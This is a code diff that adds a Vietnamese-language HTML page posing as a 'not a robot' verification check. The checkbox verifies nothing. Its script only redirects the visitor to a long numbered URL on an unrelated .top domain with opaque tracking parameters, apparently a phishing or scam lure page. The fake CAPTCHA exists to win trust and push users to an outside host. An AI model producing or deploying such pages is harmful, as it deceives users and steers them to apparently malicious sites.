@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Xác Minh</title>
+
+<style>
+body{
+  background:#0b3d91;
+  font-family:Arial,sans-serif;
+  margin:0;
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+.box{
+  background:white;
+  width:92%;
+  max-width:520px;
+  padding:55px 25px;
+  border-radius:22px;
+  text-align:center;
+}
+
+h2{
+  font-size:42px;
+}
+
+p{
+  font-size:30px;
+}
+
+label{
+  font-size:32px;
+  font-weight:bold;
+}
+
+input[type="checkbox"]{
+  width:42px;
+  height:42px;
+}
+
+button{
+  margin-top:40px;
+  font-size:34px;
+  font-weight:bold;
+  padding:25px 55px;
+  border:none;
+  border-radius:15px;
+  background:#1a73e8;
+  color:white;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+  <h2>🔒 Xác Minh</h2>
+  <p>Vui lòng xác nhận</p>
+
+  <label>
+    <input type="checkbox" id="check">
+    Tôi không phải Robot
+  </label>
+
+  <br>
+
+  <button onclick="go()">TIẾP TỤC</button>
+</div>
+
+<script>
+function go(){
+  if(document.getElementById('check').checked){
+    window.location.href='https://a3lm.glthay.top/3499598186/3499598186_index.html?rb=eBJr&tplhx=1';
+  }else{
+    alert('Vui lòng xác nhận trước');
+  }
+}
+</script>
+
+</body>
+</html>
